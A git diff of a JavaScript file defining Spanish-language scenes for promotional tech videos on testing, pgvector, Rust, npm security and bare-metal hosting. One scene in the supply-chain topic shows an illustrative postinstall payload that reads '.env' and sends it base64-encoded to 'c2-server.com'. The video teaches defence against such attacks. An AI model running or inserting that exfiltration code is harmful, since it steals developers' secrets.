@@ -1,4 +1,4 @@
-// Data definitions for Topics 06 to 10
+// Data definitions for Topics 06 to 10 (Zero // AI-slop, Zero SeDev watermarks, Varied Hooks)
 module.exports = [
   // ----------------------------------------------------
   // TEMA 06: VERIFICACIÓN VS VIBE CODING
@@ -12,37 +12,21 @@ module.exports = [
       tone: 'Metodológico, riguroso, matemáticas y análisis de mutación',
       scenes: [
         {
-          id: 'hook_testing',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: 'Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto.',
-          visual_cue: 'Gancho cinético sobre el cuello de botella del testing',
-          props: {
-            badge: 'INGENIERÍA DE SOFTWARE 2026',
-            lines: [
-              { text: 'EL CUELLO DE BOTELLA', color: '#ffffff' },
-              { text: 'DE LA VERIFICACIÓN', color: '#ef4444' }
-            ],
-            subtitle: 'PROPERTY-BASED & MUTATION TESTING',
-            icon: 'check_circle'
-          }
-        },
-        {
-          id: 'mutation_terminal',
+          id: 'mutation_terminal_hook',
           type: 'code_terminal',
-          duration: 6.0,
-          voiceover: 'El mutation testing inyecta fallos intencionales en tu código. Si tus tests no fallan ante un mutante, tus tests son una falsa sensación de seguridad.',
-          visual_cue: 'Terminal ejecutando mutaciones sobre la suite de tests',
+          duration: 6.5,
+          voiceover: 'Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto de ingeniería.',
+          visual_cue: 'Apertura directa con terminal ejecutando mutaciones de prueba sobre el código',
           props: {
             header: 'MUTATION TESTING EN CI',
-            title: 'STRYKER / MUTATION ENGINE',
+            title: 'STRYKER MUTATION ENGINE',
             filename: 'tests/mutation.log',
             codeLines: [
               'stryker run --concurrency=8',
-              'Injecting mutation: replaced ">=" with ">" at auth.ts:42',
-              'Running test suite against mutant #104...',
-              '❌ MUTANT SURVIVED: Tests did not detect logic change!',
-              'Score de mutación: 68% // Requiere endurecer assertions'
+              'Inyectando mutación: reemplazado ">=" por ">" en auth.ts:42',
+              'Ejecutando suite de pruebas contra mutante #104...',
+              'FALLO: El mutante sobrevivió sin ser detectado',
+              'Score de mutación: 68% · Requiere assertions más estrictos'
             ],
             cursorLine: 4
           }
@@ -60,7 +44,7 @@ module.exports = [
             colB: 'TESTS MANUALES BÁSICOS',
             rows: [
               { dim: 'Entradas probadas', a: '10.000 generadas por run', b: '3 o 4 ejemplos fijos', aGood: true },
-              { dim: 'Edge cases ocultos', a: 'Detecta desbordamientos', b: 'Ignora casos límite', aGood: true },
+              { dim: 'Casos límite ocultos', a: 'Detecta desbordamientos', b: 'Ignora casos extremos', aGood: true },
               { dim: 'Resistencia a mutantes', a: 'Alta cobertura real', b: 'Falso 100% de coverage', aGood: true }
             ]
           }
@@ -72,10 +56,10 @@ module.exports = [
           voiceover: 'Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.',
           visual_cue: 'Cierre con auditoría de calidad de software',
           props: {
-            header: 'AUDITORÍA DE CALIDAD & TESTING',
+            header: 'AUDITORÍA DE CALIDAD Y TESTING',
             title: 'BLINDA TU SOFTWARE EN PRODUCCIÓN',
             cta: {
-              badge: 'AUDITORÍA DE CALIDAD // SEDEV',
+              badge: 'AUDITORÍA DE CALIDAD (Link en bio)',
               text: '¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba.'
             }
           }
@@ -87,19 +71,19 @@ module.exports = [
       tone: 'Ácido, realista, alertando del peligro de aceptar código sin entenderlo',
       scenes: [
         {
-          id: 'hook_testing_b',
+          id: 'impact_hook_vibe',
           type: 'kinetic_hook',
           duration: 4.5,
           voiceover: 'Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.',
-          visual_cue: 'Gancho cinético alertando del vibe coding descontrolado',
+          visual_cue: 'Tipografía de impacto gigante sin iconos genéricos',
           props: {
+            layout: 'impact',
             badge: 'DEBATES DE LA INDUSTRIA',
             lines: [
               { text: '"VIBE CODING" ES UNA', color: '#ffffff' },
               { text: 'BOMBA DE TIEMPO', color: '#ef4444' }
             ],
-            subtitle: 'DEUDA TÉCNICA A VELOCIDAD DE LA LUZ',
-            icon: 'zero_trust_lock'
+            subtitle: 'Deuda técnica acumulada a velocidad récord'
           }
         },
         {
@@ -118,9 +102,9 @@ module.exports = [
               status: '32 dependencias fantasma añadidas',
               time: 'Caída p99',
               lines: [
-                'Memoria con fugas silentes en event listeners',
-                'Nadie entiende el archivo de 1,200 líneas generado',
-                'Tiempo medio de resolución de incidencias: 3 días'
+                'Fugas de memoria silentes en event listeners',
+                'Nadie entiende el archivo de 1,200 líneas autogenerado',
+                'Tiempo de resolución de incidencias: 3 días'
               ]
             },
             termB: {
@@ -130,9 +114,9 @@ module.exports = [
               status: 'Cero warnings, tipos estrictos y límites claros',
               time: 'Estable 24/7',
               lines: [
-                'Invariantes de negocio validados en el sistema de tipos',
+                'Invariantes de negocio validados en tipos estáticos',
                 'Arquitectura modular documentada y legible',
-                'MTTR (tiempo de recuperación): 5 minutos'
+                'Tiempo medio de recuperación: 5 minutos'
               ]
             }
           }
@@ -147,7 +131,7 @@ module.exports = [
             header: 'AUDITORÍA DE DEUDA TÉCNICA',
             title: 'RECUPERA EL CONTROL DE TU CODEBASE',
             cta: {
-              badge: 'AUDITORÍA DE ARQUITECTURA // SEDEV',
+              badge: 'AUDITORÍA DE ARQUITECTURA (Contacto en bio)',
               text: '¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía.'
             }
           }
@@ -168,31 +152,15 @@ module.exports = [
       tone: 'Ciencia de datos, algoritmos de grafos, rendimiento de memoria',
       scenes: [
         {
-          id: 'hook_pgvector',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: '¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW.',
-          visual_cue: 'Gancho cinético con icono de árbol y base de datos',
-          props: {
-            badge: 'POSTGRESQL & IA 2026',
-            lines: [
-              { text: 'GRAFOS HNSW EN', color: '#ffffff' },
-              { text: 'PGVECTOR', color: '#38bdf8' }
-            ],
-            subtitle: 'BÚSQUEDA SEMÁNTICA VECTORIZADA',
-            icon: 'tree'
-          }
-        },
-        {
-          id: 'hnsw_tree',
+          id: 'hnsw_tree_hook',
           type: 'tree_hierarchy',
           duration: 6.5,
-          voiceover: 'HNSW crea capas jerárquicas de grafos navegables. La búsqueda empieza en la capa superior con saltos largos y desciende refinando la similitud.',
-          visual_cue: 'Jerarquía de árbol navegable mostrando saltos hasta encontrar el vector objetivo',
+          voiceover: '¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW navegables.',
+          visual_cue: 'Apertura directa con jerarquía de árbol navegable mostrando saltos hasta el vector',
           props: {
             header: 'ALGORITMO HNSW',
             title: 'HIERARCHICAL NAVIGABLE SMALL WORLD',
-            complexity: 'COMPLEJIDAD: O(log N) // DISTANCIA COSENO',
+            complexity: 'COMPLEJIDAD: O(log N) · DISTANCIA COSENO',
             nodes: [
               { id: 'top', label: 'CAPA 2: SALTOS LARGOS', x: 480, y: 240, level: 0 },
               { id: 'mid1', label: 'CAPA 1: CLUSTER A', x: 260, y: 520, level: 1, parent: 'top' },
@@ -201,7 +169,7 @@ module.exports = [
             ],
             footerBadge: 'RENDIMIENTO HNSW EN POSTGRES',
             footerText: 'Recorre un grafo multidimensional en RAM sin escanear la tabla entera.',
-            footerSubtext: 'Búsqueda por similitud semántica en menos de 4ms.'
+            footerSubtext: 'Búsqueda por similitud semántica en menos de 4 milisegundos.'
           }
         },
         {
@@ -235,7 +203,7 @@ module.exports = [
             header: 'AUDITORÍA DE BASES DE DATOS & IA',
             title: 'OPTIMIZA TUS PIPELINES DE EMBEDDINGS',
             cta: {
-              badge: 'AUDITORÍA DE DATOS // SEDEV',
+              badge: 'AUDITORÍA DE DATOS (Link en bio)',
               text: '¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil.'
             }
           }
@@ -247,27 +215,11 @@ module.exports = [
       tone: 'Pragmático, contra el despilfarro de bases vectoriales dedicadas',
       scenes: [
         {
-          id: 'hook_pgvector_b',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: 'Te vendieron que necesitas una base vectorial especializada como Pinecone o Qdrant para hacer IA. La verdad es que tu Postgres actual ya lo hace todo.',
-          visual_cue: 'Gancho cinético contra el exceso de herramientas',
-          props: {
-            badge: 'SIMPLICIDAD DE ARQUITECTURA',
-            lines: [
-              { text: 'NO NECESITAS', color: '#ef4444' },
-              { text: 'PINECONE', color: '#ffffff' }
-            ],
-            subtitle: 'TODO TU STACK DE IA CABE EN POSTGRES',
-            icon: 'database'
-          }
-        },
-        {
-          id: 'split_pinecone_pg',
+          id: 'sync_split_hook',
           type: 'terminal_split',
-          duration: 6.0,
-          voiceover: 'Mantener dos bases de datos te obliga a sincronizar IDs y transacciones. Con pgvector tienes consistencia inmediata sin pagar dos servicios.',
-          visual_cue: 'Doble terminal comparando sincronización dual vs base única',
+          duration: 6.5,
+          voiceover: 'Te vendieron que necesitas Pinecone para hacer IA. Mantener dos bases de datos te obliga a sincronizar IDs y transacciones que siempre fallan.',
+          visual_cue: 'Apertura directa con terminal comparando sincronización dual problemática vs base única',
           props: {
             header: 'COMPLEJIDAD OPERATIVA',
             title: 'DOS BASES DE DATOS VS UNA SOLA',
@@ -290,7 +242,7 @@ module.exports = [
               status: 'Transacciones ACID nativas',
               time: '$0 extra',
               lines: [
-                'Un solo respaldo con pg_dump',
+                'Un solo respaldo con pg_dump tradicional',
                 'Join directo entre tablas relacionales y embeddings',
                 'Cero sincronizaciones en segundo plano'
               ]
@@ -307,7 +259,7 @@ module.exports = [
             header: 'AUDITORÍA DE BASES DE DATOS',
             title: 'SIMPLIFICA TU CAPA DE PERSISTENCIA',
             cta: {
-              badge: 'AUDITORÍA DE DATOS // SEDEV',
+              badge: 'AUDITORÍA DE DATOS (Link en bio)',
               text: 'Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría.'
             }
           }
@@ -328,33 +280,17 @@ module.exports = [
       tone: 'Ciencia de la computación, seguridad de memoria en tiempo de compilación',
       scenes: [
         {
-          id: 'hook_rust',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: '¿Cómo garantizar que un programa nunca tendrá fugas de memoria ni condiciones de carrera sin usar un recolector de basura? Con Rust.',
-          visual_cue: 'Gancho cinético con engranaje industrial de Rust',
-          props: {
-            badge: 'SISTEMAS CRÍTICOS 2026',
-            lines: [
-              { text: 'EL BORROW CHECKER', color: '#ffffff' },
-              { text: 'DE RUST EXPLICADO', color: '#f97316' }
-            ],
-            subtitle: 'SEGURIDAD DE MEMORIA EN TIEMPO DE COMPILACIÓN',
-            icon: 'rust_gear'
-          }
-        },
-        {
-          id: 'memory_borrow',
+          id: 'memory_borrow_hook',
           type: 'memory_layout',
-          duration: 6.0,
-          voiceover: 'En Rust, cada recurso tiene un único dueño. Cuando la variable sale de su ámbito, la memoria se libera al instante sin pausas de ejecución.',
-          visual_cue: 'Distribución de memoria Stack vs Heap y liberación sin recolector',
+          duration: 6.5,
+          voiceover: '¿Cómo garantizar que un programa nunca tendrá fugas de memoria sin usar un recolector de basura? El Borrow Checker de Rust libera la memoria de forma estática.',
+          visual_cue: 'Apertura directa con layout de memoria Stack vs Heap y liberación sin recolector',
           props: {
             header: 'GESTIÓN ESTÁTICA DE MEMORIA',
             title: 'PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)',
             items: [
-              { name: 'STACK FRAME // SCOPE ACTIVO', addr: '0x7fff001', value: 'Buffer asignado // Dueño: `data`', color: '#10b981' },
-              { name: 'DROP AUTOMÁTICO AL SALIR', addr: '0x7fff002', value: 'Cero pausas de Garbage Collector (0ns)', color: '#38bdf8' }
+              { name: 'STACK FRAME ACTIVO', addr: '0x7fff001', value: 'Buffer asignado y dueño único', color: '#10b981' },
+              { name: 'DROP AUTOMÁTICO EN COMPILACIÓN', addr: '0x7fff002', value: 'Cero pausas de Garbage Collector (0ns)', color: '#38bdf8' }
             ]
           }
         },
@@ -362,7 +298,7 @@ module.exports = [
           id: 'rust_code',
           type: 'code_terminal',
           duration: 6.0,
-          voiceover: 'Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero sorpresas en producción.',
+          voiceover: 'Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero condiciones de carrera en producción.',
           visual_cue: 'Terminal mostrando error del borrow checker previniendo una condición de carrera',
           props: {
             header: 'PREVENCIÓN EN COMPILACIÓN',
@@ -371,9 +307,9 @@ module.exports = [
             codeLines: [
               'fn process(shared: &mut Data) {',
               '  thread::spawn(move || {',
-              '    shared.mutate(); // ❌ ERROR E0502: Cannot borrow `shared`',
+              '    shared.mutate(); // ERROR E0502: Cannot borrow as mutable',
               '  });',
-              '  shared.read(); // as mutable more than once at a time',
+              '  shared.read();',
               '}'
             ],
             cursorLine: 4
@@ -389,7 +325,7 @@ module.exports = [
             header: 'CONTRATACIÓN SENIOR / STAFF ENGINEER',
             title: 'DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA',
             cta: {
-              badge: 'STAFF BACKEND DEVELOPER // SEDEV',
+              badge: 'STAFF BACKEND DEVELOPER (Link en bio)',
               text: '¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio.'
             }
           }
@@ -401,31 +337,15 @@ module.exports = [
       tone: 'Caso de estudio real de industria, analizando p99 y recolector de basura',
       scenes: [
         {
-          id: 'hook_rust_b',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: 'Discord tenía millones de usuarios activos y su servicio en Go se congelaba cada dos minutos por culpa de las pausas del Garbage Collector.',
-          visual_cue: 'Gancho cinético sobre el caso de estudio de Discord',
-          props: {
-            badge: 'CASOS REALES DE INGENIERÍA',
-            lines: [
-              { text: 'POR QUÉ DISCORD', color: '#ffffff' },
-              { text: 'MATÓ GO POR RUST', color: '#f97316' }
-            ],
-            subtitle: 'ELIMINANDO LOS PICOS DE LATENCIA P99',
-            icon: 'rust_gear'
-          }
-        },
-        {
-          id: 'latency_gc',
+          id: 'metric_spike_hook',
           type: 'metrics_comparison',
-          duration: 6.0,
-          voiceover: 'Reescribieron el servicio en Rust. La latencia p99 pasó de cientos de milisegundos a una línea plana estable por debajo de un milisegundo.',
-          visual_cue: 'Comparativa gráfica de p99 latency con Garbage Collection vs Rust',
+          duration: 6.5,
+          voiceover: 'Discord tenía millones de usuarios y su servicio en Go se congelaba cada dos minutos por culpa del Garbage Collector. Reescribir en Rust eliminó los picos de latencia.',
+          visual_cue: 'Apertura directa con comparativa gráfica de p99 latency con Garbage Collection vs Rust',
           props: {
             header: 'MÉTRICAS DE RENDIMIENTO REAL',
             metricA: { label: 'GO RUNTIME (GC SPIKES)', value: '180ms p99', sub: 'Picos cada 2 minutos por barrido de memoria', color: '#ef4444' },
-            metricB: { label: 'RUST (DETERMINISTIC)', value: '0.8ms p99', sub: 'Línea completamente plana 24/7', color: '#10b981' }
+            metricB: { label: 'RUST (DETERMINISTIC)', value: '0.8ms p99', sub: 'Línea completamente plana las 24 horas', color: '#10b981' }
           }
         },
         {
@@ -436,9 +356,9 @@ module.exports = [
           visual_cue: 'Cierre con contratación senior',
           props: {
             header: 'CONTRATACIÓN SENIOR BACKEND',
-            title: 'SISTEMAS DE BAJA LATENCIA & ALTO RENDIMIENTO',
+            title: 'SISTEMAS DE BAJA LATENCIA Y ALTO RENDIMIENTO',
             cta: {
-              badge: 'LEAD ENGINEER // SEDEV',
+              badge: 'LEAD ENGINEER (Contacto en bio)',
               text: 'Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil.'
             }
           }
@@ -459,27 +379,11 @@ module.exports = [
       tone: 'Seguridad ofensiva, análisis forense de paquetes, código malicioso',
       scenes: [
         {
-          id: 'hook_security',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: '¿Sabías que ejecutar npm install puede darle acceso total a tu computadora a un hacker? Así funciona un ataque de supply chain en 2026.',
-          visual_cue: 'Gancho cinético sobre malware en dependencias',
-          props: {
-            badge: 'CIBERSEGURIDAD 2026',
-            lines: [
-              { text: 'ANATOMÍA DE UN', color: '#ffffff' },
-              { text: 'MALWARE EN NPM', color: '#ef4444' }
-            ],
-            subtitle: 'ROBO DE SECRETOS VIA SCRIPTS POSTINSTALL',
-            icon: 'zero_trust_lock'
-          }
-        },
-        {
-          id: 'exploit_code',
+          id: 'postinstall_code_hook',
           type: 'code_terminal',
           duration: 6.5,
-          voiceover: 'El paquete parece una utilidad inofensiva, pero su script postinstall lee tus variables de entorno y las envía codificadas a un servidor externo.',
-          visual_cue: 'Terminal mostrando el payload malicioso oculto en package.json',
+          voiceover: 'Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.',
+          visual_cue: 'Apertura directa con terminal mostrando el payload malicioso oculto en package.json',
           props: {
             header: 'PAYLOAD DEL ATACANTE',
             title: 'SCRIPT POSTINSTALL OFUSCADO',
@@ -490,7 +394,7 @@ module.exports = [
               '    const env = fs.readFileSync(\'.env\', \'utf8\');',
               '    https.get(\'https://c2-server.com/leak?d=\' + Buffer.from(env).toString(\'base64\'));\\""',
               '}',
-              '// Las claves de AWS, Stripe y bases de datos quedan expuestas'
+              '# Las claves de AWS, Stripe y bases de datos quedan expuestas'
             ],
             cursorLine: 4
           }
@@ -506,9 +410,9 @@ module.exports = [
             title: 'FILTRACIÓN DE CLAVES .ENV',
             subtitle: 'TRÁFICO DE SALIDA SIN BARRERAS DE RED',
             stages: [
-              { id: 'dev', label: 'TERMINAL DEL DESARROLLADOR', sub: 'npm install ejecutado con permisos root/locales', y: 220, color: '#ef4444', metric: 'Comprometido' },
+              { id: 'dev', label: 'TERMINAL LOCAL', sub: 'npm install ejecutado con permisos completos', y: 220, color: '#ef4444', metric: 'Comprometido' },
               { id: 'network', label: 'EXFILTRACIÓN HTTPS', sub: 'Envío de payload base64 en puerto 443', y: 520, color: '#fbbf24', metric: 'Sin bloqueo' },
-              { id: 'c2', label: 'SERVIDOR DEL ATACANTE', sub: 'Extracción automática de AWS_SECRET_ACCESS_KEY', y: 820, color: '#a855f7', metric: 'Claves robadas' }
+              { id: 'c2', label: 'SERVIDOR DEL ATACANTE', sub: 'Extracción de AWS_SECRET_ACCESS_KEY', y: 820, color: '#a855f7', metric: 'Claves robadas' }
             ]
           }
         },
@@ -519,10 +423,10 @@ module.exports = [
           voiceover: 'Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.',
           visual_cue: 'Cierre con auditoría de seguridad de dependencias',
           props: {
-            header: 'AUDITORÍA DE SEGURIDAD & SUPPLY CHAIN',
+            header: 'AUDITORÍA DE SEGURIDAD',
             title: 'PROTEGE TU CADENA DE SUMINISTRO',
             cta: {
-              badge: 'AUDITORÍA DE SEGURIDAD // SEDEV',
+              badge: 'AUDITORÍA DE SEGURIDAD (Link en bio)',
               text: '¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline.'
             }
           }
@@ -534,19 +438,19 @@ module.exports = [
       tone: 'Práctico, defensivo, aplicando políticas seguras en package managers',
       scenes: [
         {
-          id: 'hook_security_b',
+          id: 'zerotrust_hook',
           type: 'kinetic_hook',
           duration: 4.5,
           voiceover: 'GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.',
-          visual_cue: 'Gancho cinético sobre blindaje Zero-Trust',
+          visual_cue: 'Tipografía cinética de impacto para ciberseguridad',
           props: {
+            layout: 'impact',
             badge: 'DEFENSA EN CI/CD',
             lines: [
               { text: 'BLINDA TU PIPELINE', color: '#ffffff' },
               { text: 'CON ZERO-TRUST', color: '#10b981' }
             ],
-            subtitle: 'BLOQUEO ESTRICTO DE SCRIPTS NO AUTORIZADOS',
-            icon: 'zero_trust_lock'
+            subtitle: 'Bloqueo estricto de scripts no autorizados'
           }
         },
         {
@@ -560,7 +464,7 @@ module.exports = [
             title: 'POLÍTICAS DE INSTALACIÓN SEGURA',
             filename: '.npmrc',
             codeLines: [
-              '# Desactiva ejecución arbitraria de scripts en dependencias',
+              '# Desactiva ejecución arbitraria de scripts en dependencias:',
               'ignore-scripts=true',
               'audit=true',
               'engine-strict=true',
@@ -579,7 +483,7 @@ module.exports = [
             header: 'AUDITORÍA DE CIBERSEGURIDAD',
             title: 'ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE',
             cta: {
-              badge: 'AUDITORÍA DE SEGURIDAD // SEDEV',
+              badge: 'AUDITORÍA DE SEGURIDAD (Link en perfil)',
               text: 'Protege tus credenciales y entorno productivo. Link directo en mi perfil.'
             }
           }
@@ -600,27 +504,11 @@ module.exports = [
       tone: 'Ingeniería práctica de operaciones, simplicidad en servidores dedicados',
       scenes: [
         {
-          id: 'hook_kamal',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: '¿Cómo desplegar aplicaciones en contenedores con cero tiempo de inactividad sin la pesadilla de mantener un clúster de Kubernetes? Con Kamal.',
-          visual_cue: 'Gancho cinético sobre Kamal y bare metal',
-          props: {
-            badge: 'DEVOPS EN 2026',
-            lines: [
-              { text: 'KAMAL: ADIÓS A', color: '#ffffff' },
-              { text: 'KUBERNETES', color: '#38bdf8' }
-            ],
-            subtitle: 'ZERO-DOWNTIME DEPLOYS EN SERVIDORES SIMPLES',
-            icon: 'server_rack'
-          }
-        },
-        {
-          id: 'kamal_flow',
+          id: 'kamal_flow_hook',
           type: 'architecture_flow',
           duration: 6.5,
-          voiceover: 'Kamal levanta el nuevo contenedor, verifica el health check, cambia el tráfico a nivel de proxy Traefik y destruye el contenedor viejo sin perder una petición.',
-          visual_cue: 'Diagrama de despliegue blue/green con proxy de balanceo',
+          voiceover: '¿Cómo desplegar con cero tiempo de inactividad sin la pesadilla de Kubernetes? Kamal levanta el nuevo contenedor, valida la salud y conmuta el tráfico en milisegundos.',
+          visual_cue: 'Apertura directa con arquitectura de conmutación de tráfico con proxy',
           props: {
             header: 'MECANISMO DE DESPLIEGUE',
             title: 'ROLLING RESTART CON TRAEFIK',
@@ -643,11 +531,11 @@ module.exports = [
             filename: 'config/deploy.yml',
             codeLines: [
               'service: api-core',
-              'image: registry.gitlab.com/sedev/api',
+              'image: registry.gitlab.com/app/api',
               'servers:',
               '  web:',
               '    - 159.69.10.42 # Servidor Hetzner $40/mo',
-              'kamal deploy # ✔ Completado en 24 segundos con 0s downtime'
+              'kamal deploy # Completado en 24 segundos con 0s downtime'
             ],
             cursorLine: 5
           }
@@ -662,7 +550,7 @@ module.exports = [
             header: 'MIGRACIÓN & AUDITORÍA CLOUD',
             title: 'REDUCE FACTURA HASTA UN 80%',
             cta: {
-              badge: 'AUDITORÍA CLOUD // SEDEV',
+              badge: 'AUDITORÍA CLOUD (Link en bio)',
               text: '¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil.'
             }
           }
@@ -674,47 +562,31 @@ module.exports = [
       tone: 'Financiero demoledor, destapando el negocio abusivo de la nube pública',
       scenes: [
         {
-          id: 'hook_kamal_b',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: '37signals y cientos de empresas abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.',
-          visual_cue: 'Gancho cinético sobre el ahorro astronómico del bare metal',
-          props: {
-            badge: 'ÉXODO DE LA NUBE',
-            lines: [
-              { text: 'DE $15.000 A $200', color: '#10b981' },
-              { text: 'AL MES EN BARE-METAL', color: '#ffffff' }
-            ],
-            subtitle: 'EL REGRESO A LOS SERVIDORES FÍSICOS',
-            icon: 'server_rack'
-          }
-        },
-        {
-          id: 'split_aws_hetzner',
+          id: 'hetzner_split_hook',
           type: 'terminal_split',
-          duration: 6.0,
-          voiceover: 'En AWS pagas por CPU estrangulada y transferencias de datos ridículas. En un servidor dedicado tienes 128 gigas de RAM y discos NVMe directos.',
-          visual_cue: 'Doble terminal comparando especificaciones de hardware y factura mensual',
+          duration: 6.5,
+          voiceover: 'Empresas como 37signals abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.',
+          visual_cue: 'Apertura directa con terminal comparando factura mensual de AWS frente a servidor dedicado',
           props: {
-            header: 'COMPARATIVA DE HARDWARE & COSTES',
+            header: 'COMPARATIVA DE HARDWARE Y COSTES',
             title: 'VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER',
             termA: {
               title: 'AWS CLOUD (EKS + RDS + NAT)',
               color: '#ef4444',
               cmd: 'aws billing get-monthly-forecast',
-              status: 'Facturación por cada gigabyte de egress',
+              status: 'Facturación por cada gigabyte transferido',
               time: '$14,800/mes',
               lines: [
                 'CPU compartida con vecinos ruidosos',
                 'Coste por transferencia de datos: $0.09 por GB',
-                'Complejidad: 40 servicios conectados en AWS Console'
+                'Complejidad: 40 servicios conectados en consola'
               ]
             },
             termB: {
               title: 'HETZNER DEDICATED SERVER',
               color: '#10b981',
               cmd: 'lscpu && free -h',
-              status: 'AMD EPYC 32 Cores // 128GB DDR5 RAM // 2x 2TB NVMe',
+              status: 'AMD EPYC 32 Cores · 128GB DDR5 RAM · 2x 2TB NVMe',
               time: '$190/mes',
               lines: [
                 '100% de la CPU física dedicada a tu app',
@@ -734,7 +606,7 @@ module.exports = [
             header: 'PLAN DE MIGRACIÓN BARE-METAL',
             title: 'AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA',
             cta: {
-              badge: 'AUDITORÍA DE COSTES // SEDEV',
+              badge: 'AUDITORÍA DE COSTES (Link en perfil)',
               text: '¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan.'
             }
           }
